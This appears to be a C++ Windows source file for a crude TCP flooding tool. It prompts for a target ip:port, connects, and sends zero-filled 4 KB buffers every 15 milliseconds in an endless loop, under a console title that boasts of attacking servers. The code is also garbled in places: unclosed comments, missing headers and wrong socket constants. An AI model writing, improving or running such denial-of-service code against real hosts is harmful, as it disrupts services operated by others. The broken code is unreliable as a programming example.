#include <iostream>
#include <string>
#include <cstdint>
#include <vector>
#include <ws2tcpip.h>
#include <ws2def.h>

auto __vectorcall main() -> std::int32_t
{
    try
    {
       
     ADDRINFOW* result_info{};
     ADDRINFOW address_info{};
     WSAData socket_data{};

        /*my loadlibary is fire /
        LoadLibraryW(L"advapi32.dll");
        LoadLibraryW(L"ws2_32.dll");

        
        SetConsoleTitleW(L"fucking ur servers XD");

        / buffer should be 0x1000/
        std::int8_t socket_buffer[0x1000]{};
        std::wstring ip{};
        std::vector<std::wstring> part{};

        /* hum setup */
        std::memset(&address_info.ai_addrlen, 0, 32ull);
        address_info.ai_flags = AF_UNSPEC;
        address_info.ai_family = SO_ACCEPTCONN;
        address_info.ai_socktype = SOCK_STREAM;
        address_info.ai_protocol = IPPROTO_TCP;

       
        WSAStartup(0x202u, &socket_data);

        
        std::wcout << L"ip address (ip:port): ";
        std::wcin >> ip;
        std::wcout << L"connection..." << std::endl;

      
        if (const auto colon_position = ip.find(':'); colon_position != std::string::npos)
        {
            part.push_back(ip.substr(0, colon_position));
            part.push_back(ip.substr(colon_position + 1));
        }
        else
        {
            throw std::exception("check ip");
        }

    
        while (true)
        {
            /* performing dns and loop the packet sending*/
            if (GetAddrInfoW(part[0].c_str(), part[1].c_str(), &address_info, &result_info))
            {
                break;
            }

            /* socket up  */
            const auto socket_result = socket(result_info->ai_family, result_info->ai_socktype, result_info->ai_protocol);
            if (socket_result == -1ull)
            {
                std::wcout << " failed socket" << std::endl;
                FreeAddrInfoW(result_info);
                WSACleanup();
            }

            
            const auto connect_result = connect(socket_result, result_info->ai_addr, 0x10);
            if (connect_result == -1)
            {
                std::wcout << L"failed the host" << std::endl;
                FreeAddrInfoW(result_info);
                closesocket(socket_result);
                WSACleanup();
            }

            /*good fine af*/
            std::wcout << L"[coolmathgames] connection established" << std::endl;
            std::memset(socket_buffer, 0, sizeof socket_buffer);

            /* packet sended! */
            while (send(socket_result, reinterpret_cast<const char*>(socket_buffer), 0x1000, 0) != -1)
            {
                std::this_thread::sleep_for(std::chrono::milliseconds(15));
            }

            /*not important sum packet errors */
            const auto message = L" failed packet (" + std::to_wstring(GetLastError()) + L")";
            std::wcout << message << std::endl;
            FreeAddrInfoW(result_info);
            closesocket(socket_result);
        }
    }
    catch (const std::exception& ex)
    {
        std::wcout << L"done! " << ex.what() << std::endl;
        WSACleanup();
    }
}
